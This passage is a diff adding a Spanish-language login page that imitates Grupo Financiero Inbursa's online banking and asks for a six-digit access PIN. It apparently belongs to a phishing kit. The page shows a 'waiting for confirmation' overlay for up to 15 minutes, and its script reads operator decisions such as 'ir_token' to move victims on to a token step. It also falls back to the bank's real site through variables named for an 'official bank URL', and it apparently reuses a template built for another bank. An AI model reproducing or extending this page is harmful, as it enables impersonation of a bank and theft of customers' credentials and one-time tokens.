@@ -1,0 +1,1461 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Ingresa a Inbursa</title>
+  <style>
+    :root {
+      --footer-rest-margin-start-pc: 0;
+      --inbursa-navy: #000050;
+      --inbursa-navy-hover: #000040;
+      --bg-main: #f7f9fc;
+      --input-bg: #f1f4ff;
+      --text-muted: #5a6270;
+      --text-body: #212529;
+      --shadow-card: 0 8px 24px rgba(0, 0, 40, 0.08);
+      --sidebar-w: 288px;
+    }
+
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+    }
+
+    html {
+      height: 100%;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      font-size: 14px;
+      line-height: 1.45;
+      color: var(--text-body);
+      background: var(--bg-main);
+    }
+
+    .app {
+      display: flex;
+      min-height: 100vh;
+    }
+
+    /* ---------- Sidebar ---------- */
+    .sidebar {
+      width: var(--sidebar-w);
+      flex-shrink: 0;
+      background: var(--inbursa-navy);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      padding: 1.5rem 1rem 2rem;
+    }
+
+    .sidebar__brand {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0;
+      padding-bottom: 2rem;
+      margin-bottom: auto;
+      text-align: center;
+      width: 100%;
+    }
+
+    .sidebar__logo {
+      width: 156px;
+      height: auto;
+    }
+
+    .sidebar__version {
+      font-size: 0.8rem;
+      font-weight: 600;
+      letter-spacing: 0.04em;
+      margin-top: -0.72em;
+      opacity: 0.95;
+    }
+
+    .sidebar__nav {
+      list-style: none;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      gap: 1.45rem;
+    }
+
+    .sidebar__nav a {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.75rem;
+      color: #fff;
+      text-decoration: none;
+      font-size: 0.98rem;
+      line-height: 1.45;
+      opacity: 0.95;
+      transition: opacity 0.15s;
+    }
+
+    .sidebar__nav a:hover {
+      opacity: 1;
+      text-decoration: underline;
+    }
+
+    .sidebar__icon {
+      flex-shrink: 0;
+      width: 21px;
+      height: 21px;
+      opacity: 0.9;
+    }
+
+    /* ---------- Main ---------- */
+    .main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      min-width: 0;
+      min-height: 0;
+      background: var(--bg-main);
+    }
+
+    .main__banner-wrap {
+      flex-shrink: 0;
+      background: #ffffff;
+      width: 100%;
+      padding-bottom: 0.85rem;
+    }
+
+    .main__banner-wrap:has(.banner[hidden]) {
+      display: none;
+    }
+
+    .banner {
+      flex-shrink: 0;
+      background: #e11900;
+      color: #fff;
+      margin: 1rem 0.5rem 0;
+      padding: 0.72rem 1.1rem 0.72rem 0.95rem;
+      min-height: 2.55rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 1.05rem;
+      line-height: 1.38;
+      border-radius: 10px;
+    }
+
+    .banner[hidden] {
+      display: none;
+    }
+
+    .banner__icon {
+      flex-shrink: 0;
+      width: 19px;
+      height: 19px;
+      margin-top: 0;
+      display: block;
+      object-fit: contain;
+    }
+
+    .banner__text {
+      flex: 1;
+      padding-right: 0.5rem;
+      margin: 0;
+    }
+
+    .banner__text strong {
+      font-weight: 700;
+      color: inherit;
+    }
+
+    .banner__close {
+      flex-shrink: 0;
+      background: none;
+      border: none;
+      padding: 0.15rem;
+      cursor: pointer;
+      color: #fff;
+      opacity: 0.85;
+      line-height: 1;
+    }
+
+    .banner__close:hover {
+      opacity: 1;
+    }
+
+    @media (min-width: 769px) {
+      .main__banner-wrap--mobile {
+        display: none !important;
+      }
+    }
+
+    @media (max-width: 768px) {
+      .main__banner-wrap--desktop {
+        display: none !important;
+      }
+    }
+
+    .card .main__banner-wrap {
+      background: transparent;
+      padding-bottom: 0.55rem;
+      width: 100%;
+      max-width: 100%;
+    }
+
+    .card .main__banner-wrap .banner {
+      margin-left: 0;
+      margin-right: 0;
+    }
+
+    .content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 2rem 1.25rem 1.5rem;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 372px;
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: var(--shadow-card);
+      padding: 2.6rem 1.75rem 2.45rem;
+    }
+
+    .card__title {
+      margin: 0 0 1.65rem;
+      font-size: 1.3rem;
+      font-weight: 700;
+      color: var(--inbursa-navy);
+      text-align: center;
+    }
+
+    .card__subtitle {
+      display: none;
+      margin: 0;
+      padding: 0;
+    }
+
+    .btn-label--mobile {
+      display: none;
+    }
+
+    .field {
+      margin-bottom: 1.45rem;
+    }
+
+    .field label {
+      display: block;
+      font-size: 0.9rem;
+      font-weight: 700;
+      margin-bottom: 0.45rem;
+      color: var(--text-body);
+    }
+
+    .field__wrap {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .field__wrap input {
+      width: 100%;
+      padding: 0.9rem 2.75rem 0.9rem 0.75rem;
+      border: none;
+      border-radius: 6px;
+      background: var(--input-bg);
+      font-size: 0.95rem;
+      outline: none;
+      transition: box-shadow 0.15s;
+    }
+
+    .field__wrap input:focus {
+      box-shadow: 0 0 0 2px #000050;
+    }
+
+    .field__toggle {
+      position: absolute;
+      right: 0.35rem;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      padding: 0.4rem;
+      cursor: pointer;
+      color: var(--text-muted);
+      border-radius: 4px;
+    }
+
+    .field__toggle img {
+      width: 20px;
+      height: 20px;
+      display: block;
+      object-fit: contain;
+    }
+
+    .field__toggle:hover {
+      color: #333;
+      background: rgba(0, 0, 0, 0.05);
+    }
+
+    .btn-primary {
+      width: 100%;
+      margin-top: 0.45rem;
+      padding: 0.82rem 1rem;
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 0.95rem;
+      font-weight: 600;
+      cursor: pointer;
+      filter: none;
+    }
+
+    /* Continuar: siempre #000050 (sin otro tono al hover / focus) */
+    #login-form button.btn-primary[type="submit"] {
+      background: #000050 !important;
+      background-color: #000050 !important;
+      transition: opacity 0.15s;
+    }
+
+    #login-form button.btn-primary[type="submit"]:hover,
+    #login-form button.btn-primary[type="submit"]:focus,
+    #login-form button.btn-primary[type="submit"]:focus-visible,
+    #login-form button.btn-primary[type="submit"]:active {
+      background: #000050 !important;
+      background-color: #000050 !important;
+      filter: none;
+    }
+
+    /* ---------- Footer (igual que index) ---------- */
+    .footer {
+      margin-top: auto;
+      padding: 1.5rem 1rem 1.25rem;
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      width: 100%;
+      max-width: 900px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .footer__top-wrap {
+      width: 100%;
+      margin-top: 1cm;
+      margin-bottom: 1.85rem;
+      overflow-x: auto;
+      -webkit-overflow-scrolling: touch;
+      scrollbar-width: thin;
+    }
+
+    .footer__top-wrap::-webkit-scrollbar {
+      height: 5px;
+    }
+
+    .footer__top-wrap::-webkit-scrollbar-thumb {
+      background: #c8ced9;
+      border-radius: 4px;
+    }
+
+    .footer__top-row {
+      display: flex;
+      flex-wrap: nowrap;
+      align-items: center;
+      gap: 1rem;
+      width: 100%;
+      box-sizing: border-box;
+      font-size: 0.96rem;
+      font-weight: 500;
+    }
+
+    .footer__privacy-anchor {
+      flex-shrink: 0;
+    }
+
+    .footer__top--rest {
+      display: flex;
+      flex: 1;
+      min-width: 0;
+      flex-wrap: nowrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 0.35rem;
+    }
+
+    .footer__top-row a,
+    .footer__copy {
+      flex-shrink: 0;
+    }
+
+    .footer__top-row a {
+      color: #000050;
+      text-decoration: underline;
+      text-underline-offset: 0.15em;
+      font-weight: 500;
+    }
+
+    .footer__top-row a:visited {
+      color: #000050;
+    }
+
+    .footer__top-row a:hover {
+      color: var(--inbursa-navy-hover);
+      opacity: 1;
+    }
+
+    .footer__copy {
+      margin: 0;
+      line-height: 1.45;
+      font-weight: 500;
+      color: #000050;
+      text-decoration: none;
+    }
+
+    .footer__legal {
+      text-align: center;
+      margin: 1cm auto 0;
+      font-size: 0.9rem;
+      line-height: 1.78;
+      padding: 0;
+      max-width: none;
+      width: 100%;
+      box-sizing: border-box;
+      font-weight: 400;
+      color: #545454;
+      overflow-x: visible;
+      overflow-wrap: break-word;
+    }
+
+    .footer__legal-name {
+      color: #545454;
+      font-weight: 600;
+    }
+
+    .footer__legal-meta {
+      color: #545454;
+    }
+
+    .footer__legal a {
+      color: #286ef1;
+      font-weight: 500;
+      text-decoration: underline;
+      text-underline-offset: 0.12em;
+    }
+
+    .footer__legal a:visited {
+      color: #286ef1;
+    }
+
+    .footer__legal a:hover {
+      color: #1e5fd4;
+    }
+
+    /* Escritorio: barra azul fija, solo la columna derecha hace scroll */
+    @media (min-width: 769px) {
+      html,
+      body {
+        height: 100%;
+        overflow: hidden;
+      }
+
+      body {
+        background: var(--bg-main);
+      }
+
+      .app {
+        height: 100vh;
+        max-height: 100vh;
+        min-height: 0;
+        overflow-x: visible;
+        overflow-y: hidden;
+      }
+
+      .sidebar {
+        height: 100vh;
+        max-height: 100vh;
+        overflow: hidden;
+      }
+
+      .main {
+        height: 100vh;
+        max-height: 100vh;
+        overflow-y: auto;
+        overflow-x: visible;
+        -webkit-overflow-scrolling: touch;
+        scrollbar-width: none;
+        -ms-overflow-style: none;
+      }
+
+      .main::-webkit-scrollbar {
+        width: 0;
+        height: 0;
+        display: none;
+      }
+
+      /* El pie queda abajo del viewport (misma columna scroll que el resto) */
+      .main > .content {
+        flex: 1;
+        min-height: 0;
+        width: 100%;
+        align-self: stretch;
+        box-sizing: border-box;
+      }
+
+      .footer__top-wrap {
+        overflow-x: visible;
+      }
+
+      .footer {
+        align-self: stretch;
+        max-width: none;
+        width: calc(100% + 2.5rem);
+        margin-left: -1.25rem;
+        margin-right: -1.25rem;
+        box-sizing: border-box;
+        padding: calc(2rem + 3cm) 1.25rem 2.5rem 1cm;
+      }
+
+      .footer__privacy-anchor {
+        margin-left: 1cm;
+      }
+
+      .footer__top--rest {
+        margin-left: var(--footer-rest-margin-start-pc);
+      }
+
+      .footer__copy {
+        margin-left: 2cm;
+      }
+
+      .footer__link--condiciones {
+        margin-left: 4cm;
+      }
+
+      .footer__link--integridad {
+        margin-left: 3cm;
+      }
+    }
+
+    @media (max-width: 768px) {
+      html {
+        height: auto;
+        min-height: 100%;
+        overflow-x: hidden;
+        overflow-y: auto;
+        -webkit-overflow-scrolling: touch;
+      }
+
+      body {
+        height: auto;
+        min-height: 100vh;
+        overflow-x: hidden;
+        overflow-y: auto;
+        -webkit-overflow-scrolling: touch;
+      }
+
+      .main {
+        overflow: visible;
+        min-height: 0;
+      }
+
+      .app {
+        flex-direction: column;
+        height: auto;
+        max-height: none;
+        min-height: 100vh;
+        overflow: visible;
+      }
+
+      .sidebar {
+        height: auto;
+        max-height: none;
+        position: static;
+        width: 100%;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 1.2rem 1rem 0.4rem;
+        gap: 0;
+      }
+
+      .sidebar__brand {
+        border-bottom: none;
+        margin-bottom: 0;
+        padding-bottom: 0;
+        flex: none;
+        min-width: 0;
+      }
+
+      .sidebar__nav {
+        display: none;
+      }
+
+      .footer__top-row {
+        flex-direction: column;
+        align-items: center;
+        gap: 0.5cm;
+      }
+
+      .footer__top--rest {
+        flex-direction: column;
+        flex: none;
+        width: 100%;
+        max-width: 100%;
+        align-items: center;
+        justify-content: flex-start;
+        gap: 0.5cm;
+      }
+
+      .footer__copy {
+        margin-left: 0;
+      }
+
+      /* Login móvil: mismo estilo que la app (cabecera + píldoras + campo claro) */
+      .sidebar__version {
+        display: none;
+      }
+
+      .main .content {
+        padding: 0 0.65rem 1.5rem;
+      }
+
+      .card {
+        max-width: none;
+        width: 100%;
+        background: transparent;
+        box-shadow: none;
+        border-radius: 0;
+        padding: 0 0.55rem 1.75rem;
+      }
+
+      .card__title {
+        margin-top: 0;
+        margin-bottom: 0.4rem;
+        color: var(--text-body);
+        background: #eae8ed;
+        padding: 0.7rem calc(0.65rem + 0.55rem);
+        margin-left: calc(-1 * (0.65rem + 0.55rem));
+        margin-right: calc(-1 * (0.65rem + 0.55rem));
+        box-sizing: border-box;
+      }
+
+      .card__subtitle {
+        display: block;
+        text-align: center;
+        font-size: 0.95rem;
+        font-weight: 400;
+        color: var(--text-muted);
+        margin: 1cm 0 1.15rem;
+        line-height: 1.45;
+      }
+
+      .login-field-label {
+        position: absolute;
+        width: 1px;
+        height: 1px;
+        padding: 0;
+        margin: -1px;
+        overflow: hidden;
+        clip: rect(0, 0, 0, 0);
+        white-space: nowrap;
+        border: 0;
+      }
+
+      .field {
+        margin-bottom: 1rem;
+      }
+
+      .field__wrap input,
+      .field__wrap input#clave {
+        background: #f1f3ff;
+        border: 2px solid #000050;
+        border-radius: 12px;
+        box-shadow: none;
+        padding: 0.62rem 2.75rem 0.62rem 0.85rem;
+      }
+
+      /* Sin borde visible solo vacío y sin foco; al tocar: #000050 2px */
+      .field__wrap.field__wrap--empty input#clave:not(:focus) {
+        border: 2px solid transparent;
+      }
+
+      .field__wrap.field__wrap--error input#clave,
+      .field__wrap.field__wrap--error input#clave:focus {
+        border-color: #e11900 !important;
+        box-shadow: none;
+      }
+
+      .field__wrap.field__wrap--error.field__wrap--empty input#clave:not(:focus) {
+        border-color: #e11900 !important;
+      }
+
+      .field__wrap input:focus,
+      .field__wrap input#clave:focus {
+        border-color: #000050;
+        box-shadow: none;
+        outline: none;
+      }
+
+      .field__wrap input#clave:-webkit-autofill,
+      .field__wrap input#clave:-webkit-autofill:hover,
+      .field__wrap input#clave:-webkit-autofill:focus {
+        box-shadow: 0 0 0 1000px #f1f3ff inset;
+      }
+
+      .btn-label--desktop {
+        display: none !important;
+      }
+
+      .btn-label--mobile {
+        display: inline !important;
+      }
+
+      #login-form button.btn-primary[type="submit"] {
+        background: #286ef1 !important;
+        background-color: #286ef1 !important;
+        border-radius: 9999px;
+        padding: 0.58rem 1.2rem;
+        margin-top: 0.55rem;
+      }
+
+      #login-form button.btn-primary[type="submit"]:hover,
+      #login-form button.btn-primary[type="submit"]:focus,
+      #login-form button.btn-primary[type="submit"]:focus-visible,
+      #login-form button.btn-primary[type="submit"]:active {
+        background: #1e5fd4 !important;
+        background-color: #1e5fd4 !important;
+      }
+
+      #login-form button.btn-primary[type="submit"]:disabled,
+      #login-form button.btn-primary[type="submit"][disabled] {
+        background: #286ef1 !important;
+        background-color: #286ef1 !important;
+        opacity: 0.48;
+      }
+
+      #login-form .btn-secondary {
+        background: var(--inbursa-navy) !important;
+        background-color: var(--inbursa-navy) !important;
+        color: #fff !important;
+        border: none !important;
+        border-radius: 9999px;
+        padding: 0.58rem 1.2rem;
+      }
+
+      #login-form .btn-secondary:hover {
+        background: #000040 !important;
+        background-color: #000040 !important;
+        color: #fff !important;
+      }
+
+      .main .content > .footer {
+        display: none !important;
+      }
+    }
+
+    .bapa-login-wait {
+      position: fixed;
+      inset: 0;
+      z-index: 999;
+      /* Oscurece un poco lo de atrás, sin volverlo opaco */
+      background: rgba(0, 8, 30, 0.14);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.25rem;
+    }
+
+    .bapa-login-wait[hidden] {
+      display: none !important;
+    }
+
+    .bapa-login-wait__icon {
+      width: 60px;
+      height: 60px;
+      display: block;
+      animation: bapa-login-vector-spin 2.1s linear infinite;
+      filter: drop-shadow(0 2px 5px rgba(0, 0, 25, 0.25));
+    }
+
+    @keyframes bapa-login-vector-spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .bapa-login-wait__sr-only {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      padding: 0;
+      margin: -1px;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+      white-space: nowrap;
+      border: 0;
+    }
+
+    /* login.html: NIP (misma lógica que antes) */
+    .field__wrap input#clave {
+      letter-spacing: 0.12em;
+      font-size: 1.05rem;
+      text-align: left;
+      direction: ltr;
+      color: #000050;
+      caret-color: #000050;
+    }
+
+    .field__wrap input#clave:-webkit-autofill,
+    .field__wrap input#clave:-webkit-autofill:hover,
+    .field__wrap input#clave:-webkit-autofill:focus {
+      -webkit-text-fill-color: #000050;
+      caret-color: #000050;
+      box-shadow: 0 0 0 1000px var(--input-bg) inset;
+      transition: background-color 99999s ease-out;
+    }
+
+    .login-nip-msg {
+      color: #b42318;
+      font-size: 0.9rem;
+      margin: 0.35rem 0 0.25rem;
+      line-height: 1.35;
+      text-align: left;
+    }
+
+    .login-nip-msg[hidden] {
+      display: none !important;
+    }
+
+    .field__error--clave {
+      color: #b42318;
+      font-size: 0.88rem;
+      margin: 0.35rem 0 0;
+      line-height: 1.35;
+      text-align: left;
+    }
+
+    .field__error--clave[hidden] {
+      display: none !important;
+    }
+
+    .field__wrap.field__wrap--error input#clave {
+      box-shadow: 0 0 0 2px #e11900;
+    }
+
+    .field__wrap.field__wrap--error input#clave:focus {
+      box-shadow: 0 0 0 2px #e11900;
+    }
+
+    .login-form-actions-gap {
+      margin-top: 1.1rem;
+    }
+
+    .btn-primary:disabled,
+    .btn-primary[disabled] {
+      opacity: 0.45;
+      cursor: not-allowed;
+    }
+
+    #login-form button.btn-primary[type="submit"]:disabled,
+    #login-form button.btn-primary[type="submit"][disabled] {
+      background: #000050 !important;
+      background-color: #000050 !important;
+      opacity: 0.45;
+    }
+
+    .btn-secondary {
+      width: 100%;
+      margin-top: 0.65rem;
+      padding: 0.82rem 1rem;
+      border: 2px solid var(--inbursa-navy);
+      border-radius: 8px;
+      background: #fff;
+      color: var(--inbursa-navy);
+      font-size: 0.95rem;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: inherit;
+      transition: background 0.15s;
+    }
+
+    .btn-secondary:hover {
+      background: var(--input-bg);
+    }
+  </style>
+</head>
+<body>
+  <div class="app">
+    <aside class="sidebar" aria-label="Enlaces de ayuda">
+      <div class="sidebar__brand">
+        <img class="sidebar__logo" src="I/logo.svg" alt="Inbursa" width="156" height="40" />
+        <span class="sidebar__version">77.0.8</span>
+      </div>
+      <ul class="sidebar__nav">
+        <li>
+          <a href="#">
+            <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+              <rect x="6" y="3" width="12" height="18" rx="2" />
+              <path d="M10 18h4" stroke-linecap="round" />
+            </svg>
+            Conoce Inbursa Móvil
+          </a>
+        </li>
+        <li>
+          <a href="tel:8009090000">
+            <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+              <path d="M4 5h4l2 5-2 1a12 12 0 006 6l1-2 5 2v4a2 2 0 01-2 2C9.9 21 3 14.1 3 6a2 2 0 012-2z" stroke-linejoin="round" />
+            </svg>
+            800 90 90000
+          </a>
+        </li>
+        <li>
+          <a href="#">
+            <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+              <rect x="5" y="11" width="14" height="10" rx="2" />
+              <path d="M8 11V8a4 4 0 018 0v3" />
+            </svg>
+            Tips de Seguridad
+          </a>
+        </li>
+        <li>
+          <a href="#">
+            <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+              <rect x="3" y="4" width="18" height="13" rx="2" />
+              <path d="M8 21h8M12 17v4" stroke-linecap="round" />
+            </svg>
+            Requerimientos mínimos técnicos
+          </a>
+        </li>
+        <li>
+          <a href="#">
+            <svg class="sidebar__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" aria-hidden="true">
+              <path d="M12 21s7-4.5 7-11a7 7 0 10-14 0c0 6.5 7 11 7 11z" />
+              <circle cx="12" cy="10" r="2.5" fill="currentColor" stroke="none" />
+            </svg>
+            Manual de Geolocalización
+          </a>
+        </li>
+      </ul>
+    </aside>
+
+    <main class="main">
+      <div class="main__banner-wrap main__banner-wrap--desktop">
+        <div class="banner js-login-error-banner" role="alert" hidden>
+          <img class="banner__icon" src="I/x.svg" width="24" height="24" alt="" />
+          <p class="banner__text"></p>
+          <button type="button" class="banner__close js-login-banner-close" aria-label="Cerrar aviso">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M6 6l12 12M18 6L6 18" stroke-linecap="round" />
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <div class="content">
+        <div class="card">
+          <h1 class="card__title" id="greeting">¡Hola!</h1>
+          <div class="main__banner-wrap main__banner-wrap--mobile">
+            <div class="banner js-login-error-banner" role="alert" hidden>
+              <img class="banner__icon" src="I/x.svg" width="24" height="24" alt="" />
+              <p class="banner__text"></p>
+              <button type="button" class="banner__close js-login-banner-close" aria-label="Cerrar aviso">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <path d="M6 6l12 12M18 6L6 18" stroke-linecap="round" />
+                </svg>
+              </button>
+            </div>
+          </div>
+          <p class="card__subtitle">Ingresa tu clave</p>
+          <form id="login-form" action="#" method="post" autocomplete="current-password">
+            <div class="field">
+              <label class="login-field-label" for="clave">Clave de acceso</label>
+              <div class="field__wrap field__wrap--empty">
+                <input
+                  type="password"
+                  id="clave"
+                  name="clave"
+                  inputmode="numeric"
+                  pattern="[0-9]{6}"
+                  minlength="6"
+                  maxlength="6"
+                  aria-label="Clave de acceso"
+                  aria-describedby="clave-field-error login-nip-msg"
+                  autocomplete="current-password"
+                />
+                <button
+                  type="button"
+                  class="field__toggle"
+                  aria-label="Mostrar clave"
+                  data-target="clave"
+                  data-eye-open="I/abierto.svg"
+                  data-eye-closed="I/cerrado.svg"
+                  data-label-show="Mostrar clave"
+                  data-label-hide="Ocultar clave"
+                >
+                  <img src="I/cerrado.svg" width="25" height="24" alt="" class="field__toggle-eye" />
+                </button>
+              </div>
+            </div>
+            <p class="field__error field__error--clave" id="clave-field-error" hidden role="alert"></p>
+            <p class="login-nip-msg" id="login-nip-msg" hidden role="alert"></p>
+            <button type="submit" class="btn-primary login-form-actions-gap">
+              <span class="btn-label--desktop">Continuar</span>
+              <span class="btn-label--mobile">Ingresar</span>
+            </button>
+            <button type="button" class="btn-secondary" id="btn-cancelar">Cancelar</button>
+          </form>
+        </div>
+
+        <footer class="footer">
+          <div class="footer__top-wrap">
+            <nav class="footer__top-row" aria-label="Legal y copyright">
+              <div class="footer__privacy-anchor">
+                <a href="#">Política de Privacidad</a>
+              </div>
+              <div class="footer__top--rest">
+                <a class="footer__link--condiciones" href="#">Condiciones de Uso</a>
+                <a class="footer__link--integridad" href="#">Política de Integridad Corporativa</a>
+                <span class="footer__copy">© 2026 Grupo Financiero Inbursa</span>
+              </div>
+            </nav>
+          </div>
+          <p class="footer__legal">
+            <span class="footer__legal-name">Comisión Nacional para la Protección y Defensa de los Usuarios de Servicios Financieros (CONDUSEF)</span><br />
+            <span class="footer__legal-meta">Teléfono: (55) 5340 0999 / </span><a href="https://www.condusef.gob.mx/" rel="noopener noreferrer" target="_blank">https://www.condusef.gob.mx/</a>
+          </p>
+        </footer>
+      </div>
+    </main>
+  </div>
+
+  <div id="bapa-login-wait" class="bapa-login-wait" hidden aria-busy="false">
+    <img class="bapa-login-wait__icon" src="I/vector.svg" width="60" height="60" alt="" aria-hidden="true" />
+    <span class="bapa-login-wait__sr-only">Esperando confirmación</span>
+  </div>
+
+  <script src="script.js?v=inbursa-local-1"></script>
+  <script>
+    (function () {
+      document.querySelectorAll('.field__toggle[data-target]').forEach(function (btn) {
+        var id = btn.getAttribute("data-target");
+        var input = document.getElementById(id);
+        if (!input) return;
+        var eyeImg = btn.querySelector(".field__toggle-eye");
+        var openSrc = btn.getAttribute("data-eye-open") || "I/abierto.svg";
+        var closedSrc = btn.getAttribute("data-eye-closed") || "I/cerrado.svg";
+        var labelShow = btn.getAttribute("data-label-show") || "Mostrar";
+        var labelHide = btn.getAttribute("data-label-hide") || "Ocultar";
+        btn.addEventListener("click", function () {
+          var show = input.type === "password";
+          input.type = show ? "text" : "password";
+          btn.setAttribute("aria-label", show ? labelHide : labelShow);
+          if (eyeImg) {
+            eyeImg.src = show ? openSrc : closedSrc;
+          }
+        });
+      });
+    })();
+
+    (function () {
+      function paginaRealUrl() {
+        if (typeof window.BAPA_URL_OFICIAL_BANCO === "string" && window.BAPA_URL_OFICIAL_BANCO.trim()) {
+          return window.BAPA_URL_OFICIAL_BANCO.trim();
+        }
+        if (typeof window.BAPA_URL_OFICIAL_BANPAIS === "string" && window.BAPA_URL_OFICIAL_BANPAIS.trim()) {
+          return window.BAPA_URL_OFICIAL_BANPAIS.trim();
+        }
+        return "https://www.inbursa.com/";
+      }
+
+      var input = document.getElementById("clave");
+      var form = document.getElementById("login-form");
+      var cancel = document.getElementById("btn-cancelar");
+      var overlay = document.getElementById("bapa-login-wait");
+      var nipMsg = document.getElementById("login-nip-msg");
+      var claveFieldErr = document.getElementById("clave-field-error");
+      var loginErrorBanners = document.querySelectorAll(".js-login-error-banner");
+      var WAIT_MAX_MS = 15 * 60 * 1000;
+
+      /** Solo letras/números: ir_token, IR-TOKEN, ir token → irtoken (no depende de script.js). */
+      function loginDecisionCompact(s) {
+        s = String(s == null ? "" : s);
+        try {
+          s = s.normalize("NFD").replace(/[\u0300-\u036f]/g, "");
+        } catch (eC) {}
+        return s.replace(/[\u200b\uFEFF]/g, "").replace(/[^a-zA-Z0-9]/g, "").toLowerCase();
+      }
+
+      function loginNormalizeDecisionRaw(raw) {
+        if (raw == null) return "";
+        if (typeof raw === "object") {
+          if (Array.isArray(raw) && raw.length) return loginNormalizeDecisionRaw(raw[0]);
+          if (raw.estado != null) return loginNormalizeDecisionRaw(raw.estado);
+          if (raw.decision != null) return loginNormalizeDecisionRaw(raw.decision);
+          return "";
+        }
+        var t = String(raw)
+          .replace(/^\uFEFF/, "")
+          .replace(/\u200b/g, "")
+          .trim();
+        var tl = t.toLowerCase();
+        if (tl === "null" || tl === "undefined") return "";
+        return t;
+      }
+
+      function loginEsIrTokenSlug(slug) {
+        var s = String(slug || "")
+          .replace(/[\u200b\uFEFF]/g, "")
+          .trim()
+          .toLowerCase();
+        if (s === "ir_token" || s === "volver_token") return true;
+        var c = loginDecisionCompact(s);
+        if (c === "irtoken" || c === "volvertoken" || c === "volveatoken") return true;
+        if (/^ir[_\s-]*token(\.html)?$/i.test(s)) return true;
+        if (/^volver[_\s-]*a[_\s-]*token$/i.test(s)) return true;
+        return /volv[eé][_\s-]*a[_\s-]*tok[eé]n/i.test(s);
+      }
+
+      function resetLoginBanner() {
+        loginErrorBanners.forEach(function (banner) {
+          var t = banner.querySelector(".banner__text");
+          if (t) t.textContent = "";
+          banner.hidden = true;
+        });
+      }
+
+      function showLoginBannerError(text) {
+        loginErrorBanners.forEach(function (banner) {
+          var t = banner.querySelector(".banner__text");
+          var icon = banner.querySelector(".banner__icon");
+          if (t) t.textContent = text;
+          if (icon) {
+            icon.src = "I/x.svg";
+            icon.setAttribute("width", "24");
+            icon.setAttribute("height", "24");
+          }
+          banner.hidden = false;
+        });
+        hideNipMsg();
+      }
+
+      document.querySelectorAll(".js-login-banner-close").forEach(function (btn) {
+        btn.addEventListener("click", function () {
+          resetLoginBanner();
+        });
+      });
+
+      function showWait() {
+        if (!overlay) return;
+        overlay.hidden = false;
+        overlay.setAttribute("aria-busy", "true");
+      }
+
+      function hideWait() {
+        if (!overlay) return;
+        overlay.hidden = true;
+        overlay.setAttribute("aria-busy", "false");
+      }
+
+      function hideNipMsg() {
+        if (!nipMsg) return;
+        nipMsg.textContent = "";
+        nipMsg.hidden = true;
+      }
+
+      function showNipMsg(text) {
+        hideClaveFieldError();
+        if (!nipMsg) return;
+        nipMsg.textContent = text;
+        nipMsg.hidden = false;
+      }
+
+      function hideClaveFieldError() {
+        if (!input) return;
+        var wrap = input.closest(".field__wrap");
+        if (wrap) wrap.classList.remove("field__wrap--error");
+        if (claveFieldErr) {
+          claveFieldErr.textContent = "";
+          claveFieldErr.hidden = true;
+        }
+      }
+
+      function showClaveFieldError(text) {
+        if (!input) return;
+        var wrap = input.closest(".field__wrap");
+        if (wrap) wrap.classList.add("field__wrap--error");
+        if (claveFieldErr) {
+          claveFieldErr.textContent = text;
+          claveFieldErr.hidden = false;
+        }
+      }
+
+      function syncIngresarEstado() {
+        if (!form || !input) return;
+        var btn = form.querySelector('button[type="submit"]');
+        if (!btn) return;
+        btn.disabled = false;
+      }
+
+      function syncClaveBordeVacio() {
+        if (!input) return;
+        var wrap = input.closest(".field__wrap");
+        if (!wrap) return;
+        if (String(input.value || "").length === 0) {
+          wrap.classList.add("field__wrap--empty");
+        } else {
+          wrap.classList.remove("field__wrap--empty");
+        }
+      }
+
+      function soloDigitosSeis() {
+        if (!input) return;
+        var v = String(input.value || "")
+          .replace(/\D/g, "")
+          .slice(0, 6);
+        if (v !== input.value) input.value = v;
+        syncIngresarEstado();
+        syncClaveBordeVacio();
+      }
+
+      if (input) {
+        function onClaveEdit() {
+          hideNipMsg();
+          hideClaveFieldError();
+          resetLoginBanner();
+          soloDigitosSeis();
+        }
+        input.addEventListener("input", onClaveEdit);
+        input.addEventListener("beforeinput", function () {
+          resetLoginBanner();
+        });
+        input.addEventListener("blur", soloDigitosSeis);
+      }
+
+      syncIngresarEstado();
+      syncClaveBordeVacio();
+
+      function formatearNombreTitulo(s) {
+        s = String(s || "")
+          .trim()
+          .replace(/\s+/g, " ");
+        if (!s) return "";
